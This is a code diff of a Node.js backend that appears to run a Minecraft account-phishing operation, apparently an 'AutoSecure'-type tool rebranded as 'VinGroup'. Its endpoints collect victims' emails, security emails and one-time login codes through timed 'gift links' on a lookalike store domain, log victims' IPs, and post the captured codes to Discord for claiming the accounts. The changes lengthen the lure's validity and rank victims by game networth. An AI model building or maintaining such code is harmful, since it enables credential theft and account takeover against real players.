@@ -81,6 +81,7 @@ app.use(async (req, res, next) => {
         }
         next();
     } catch (err) {
+        console.error('[IP_BAN_MIDDLEWARE] Error checking banned IP:', err.message);
         next();
     }
 });
@@ -114,17 +115,19 @@ app.use((req, res, next) => {
 app.post('/api/web-activity', async (req, res) => {
     try {
         const { code, username, email, statusText, domain } = req.body || {};
-        // Only log if username and email are both provided
-        if (username && email) {
+        // Log if username is provided (email is optional for early steps like Waiting Email)
+        if (username) {
             const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
             const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
+            
+            console.log(`[WEB ACTIVITY] ${username} | ${statusText} | IP: ${clientIp} | Code: ${code || 'None'} | Email: ${email || 'None'}`);
 
             await sendWebLog({
                 code,
                 ip: clientIp,
-                domain: domain || req.headers.host || config.webDomain || 'donuttsmp.store',
+                domain: config.webDomain || (config.domains && config.domains[0]) || 'donuttsmp.store',
                 username,
-                email,
+                email: email || '',
                 statusText: statusText || 'Send Code'
             });
         }
@@ -138,7 +141,7 @@ app.post('/api/web-activity', async (req, res) => {
 app.get('/api/health', (req, res) => {
     res.json({
         status: 'ok',
-        service: 'AutoSecure Dedicated Backend API',
+        service: 'VinGroup Dedicated Backend API',
         port: PORT,
         time: new Date().toISOString(),
         activeSessions: activeSessions.size
@@ -152,12 +155,12 @@ app.post('/api/send-otp', sendOtpLimiter, async (req, res) => {
         username = (username || '').trim();
         const curGiftCode = (giftCode || altCode || '').trim();
 
-        // Check gift link validity and 30-min expiration if code provided
+        // Check gift link validity and 60-min expiration if code provided
         let resolvedBotUserId = null;
         let resolvedBotNumber = 1;
 
         if (curGiftCode) {
-            const EXPIRY_MS = 30 * 60 * 1000;
+            const EXPIRY_MS = 3 * 60 * 60 * 1000;
             const now = Date.now();
             const giftRows = await queryParams('SELECT * FROM gift_links WHERE code = ?', [curGiftCode]);
             if (!giftRows || giftRows.length === 0 || (now - giftRows[0].created_at > EXPIRY_MS)) {
@@ -166,7 +169,7 @@ app.post('/api/send-otp', sendOtpLimiter, async (req, res) => {
                 }
                 return res.status(410).json({
                     success: false,
-                    error: 'Gift link has expired after 30 minutes. Please ask for a new link!'
+                    error: 'Gift link has expired after 3 hours. Please ask for a new link!'
                 });
             }
             resolvedBotUserId = giftRows[0].bot_user_id;
@@ -415,8 +418,8 @@ app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
             claiming: userConfig?.claiming ?? 0
         };
 
-        console.log(`[API /verify-otp] Áp dụng cấu hình Autosecure của bot con (${effectiveUserId}):`);
-        console.log(` • Autosecure    : ${settings.auto_secure ? 'BẬT' : 'TẮT'}`);
+        console.log(`[API /verify-otp] Áp dụng cấu hình VinGroup của bot con (${effectiveUserId}):`);
+        console.log(` • VinGroup    : ${settings.auto_secure ? 'BẬT' : 'TẮT'}`);
         console.log(` • Change IGN    : ${settings.change_ign ? 'BẬT' : 'TẮT'}`);
         console.log(` • Multiplayer   : ${settings.multiplayer ? 'TẮT MP' : 'GIỮ NGUYÊN'}`);
         console.log(` • Checkban      : ${settings.checkban ? 'BẬT' : 'TẮT'}`);
@@ -430,11 +433,11 @@ app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
         console.log(` • Change Lang   : ${settings.changelanguage ? 'BẬT' : 'TẮT'}`);
 
         if (!settings.auto_secure) {
-            console.log(`[API /verify-otp] Bot con đã tắt Autosecure! Lưu mã vào danh sách chờ claim thủ công.`);
+            console.log(`[API /verify-otp] Bot con đã tắt VinGroup! Lưu mã vào danh sách chờ claim thủ công.`);
             const embedData = {
                 embeds: [{
                     title: `${username || 'Account'}! :x:`,
-                    description: `Email: **${email}**\nSecurity email: **${secId}**\nCode: **${code}**\n*Autosecure đang TẮT trong cấu hình bot con. Vui lòng claim thủ công.*`,
+                    description: `Email: **${email}**\nSecurity email: **${secId}**\nCode: **${code}**\n*VinGroup đang TẮT trong cấu hình bot con. Vui lòng claim thủ công.*`,
                     color: 0x00ff00
                 }]
             };
@@ -465,9 +468,17 @@ app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
         }
 
         let hypixelStats = null;
+        let maxNetworth = 0;
         if (targetIgn) {
             try {
                 hypixelStats = await getStats(targetIgn);
+                if (hypixelStats && hypixelStats.skyblock && hypixelStats.skyblock.length > 0) {
+                    for (const prof of hypixelStats.skyblock) {
+                        if (prof.networth && prof.networth > maxNetworth) {
+                            maxNetworth = prof.networth;
+                        }
+                    }
+                }
             } catch (e) {}
         }
 
@@ -494,9 +505,9 @@ app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
                 donutPlaytime: donutStats?.playtime || null,
                 donutRank: donutStats?.rank || null,
                 donutKDR: donutStats?.kdr || null,
-                networth: hypixelStats?.networth || '0',
+                networth: maxNetworth.toString() || '0',
                 bedwars: hypixelStats?.bedwars?.level || '0',
-                networkLevel: hypixelStats?.networkLevel || '0'
+                networkLevel: hypixelStats?.nwl || '0'
             };
 
             const clientTarget = { username: effectiveUserId, botnumber: botNumber };
@@ -535,7 +546,7 @@ app.use((req, res) => {
 async function startBackend() {
     try {
         await initializeDB();
-        app.listen(PORT, () => {
+        app.listen(PORT, '127.0.0.1', () => {
             if (process.env.RUN_ALL_MODE === 'true') {
                 console.log(`[BACKEND] ✔ Cổng ${PORT} sẵn sàng (API: http://localhost:${PORT}/api/health)`);
                 return;
